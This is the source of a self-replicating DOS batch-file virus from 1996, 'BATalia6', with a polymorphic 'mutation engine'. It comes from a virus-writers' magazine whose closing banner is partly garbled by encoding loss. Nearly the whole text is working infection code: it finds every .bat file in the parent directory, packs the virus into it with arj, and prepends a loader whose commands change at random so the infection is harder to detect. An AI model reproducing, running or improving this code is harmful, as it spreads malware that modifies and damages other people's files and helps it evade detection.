:	         Death Virii Crew  &  Stealth Group World Wide
:		  	      P R E S E N T S
:	   	       First Mutation Engine for BAT !
:				Without ASM !
:		      [BATalia6] & FMEB (c) by Reminder
:
@echo off
set n=BATALIA6.BAT
if "a%1"=="af" goto find
if "a%1"=="ap" goto poly
if "a%1"=="as" goto sets
cd ..
for %%b in (*.bat) do call s_g_w_w\%0 f %%b
cd s_g_w_w
if exist test del test
goto en
:find
if "a%f%"=="ay" goto en
cd s_g_w_w
arj l ..\%2 >nul
if errorlevel 1 goto bg
goto en1
:bg
if exist real del real
set code=b
call %n% p ..\%2
set code=t
call %n% p ..\%2
set p=%rnd%
set code=1
call %n% p ..\%2 %2
set code=t
call %n% p ..\%2
set code=2
call %n% p ..\%2
echo %rulz% %2>>real
copy rulz %rulz%.bat >nul
arj a %rnd%.%rulz% %n% ..\%2 zagl rulz final.bat >nul
copy /b %rulz%.bat+%rnd%.%rulz% >nul
arj a %rulz%.%rnd% %rulz%.bat -g%p%>nul
copy /b real+%rulz%.%rnd% ..\%2 >nul
del real
del %rulz%.%rnd%
del %rnd%.%rulz%
del %rulz%.bat
set f=y
goto en1
:sets
if %rnd%==3 set rnd=4
if %rnd%==2 set rnd=3
if %rnd%==1 set rnd=2
goto en
:poly
copy zagl test >nul
:there add new method of rnd (E.g. type %2 >> test) - bad example)
type zagl >>test
echo 1 >rnd1
echo 2 >rnd2
echo 3 >rnd3
del rnd? /p <test>nul 
set rnd=1
for %%c in (rnd?) do call %0 s
echo 1 >rnd1
del rnd?>nul
goto make_%code%_%rnd%
:make_b_1
echo @echo off>>real
goto _1
:make_b_2
echo @echo OFF>>real
goto _2
:make_b_3
echo @EcHo OfF>>real
goto _3
:make_b_4
echo @ECHO OFF>>real
goto _4
:make_1_1
echo %comspec% nul /carj x %%0 -g%p%>>real
goto _1
:make_1_2
echo %%comspec%% nul /c arj x %3 -g%p%>>real
goto _2
:make_1_3
echo %%comspec%% nul /carj e %%0 -g%p%>>real
goto _3
:make_1_4
echo %comspec% nul /c arj e %3 -g%p%>>real
goto _4
:make_2_1
set rulz=i
goto _1
:make_2_2
set rulz=s
goto _2
:make_2_3
set rulz=h
goto _3
:make_2_4
set rulz=w
goto _4
:make_t_1
echo rem COMMAND.COM nul /carj x %%0 -g1>>real
goto _1
:make_t_2
echo :echo %comspec% nul /carj x %%0>>real
goto _2
:make_t_3
echo :nul arj x %%0 -g7 %comspec%>>real
goto _3
:make_t_4
echo rem arj e %%0 %%compec%% -g5>>real
goto _4
:_1
echo NY >zagl
goto en
:_2
echo YY >zagl
goto en
:_3
echo NN >zagl
goto en
:_4
echo YN >zagl
goto en
:en1
cd ..
:en
:               //         ��                  �
:  ���������  /// �����Ŀ ���     Magazine     �    for VirMakers
:  �ɻ�˻�� // // ��˻�ɳ ��� ���������������� � ������������������� � ��������
:  �Ȼ � � /////  � � ̹�  �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���
:  �ȼ � �  ///// ȼ� �ȳ   � � � ��  ��  �    �  ��  � �    � � � � � �   �
:  ������� // // ��������   � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����
:  GROUP  // // WORLDWIDE   � ����������������� �������������������������������
:
: Box 10, Kiev   252148
: Box 15, Moscow 125080
: Box 11, Lutsk  263020
:
:               R E A D    I N F E C T E D    V O I C E
:
:						(c) by Reminder (May 22, 1996)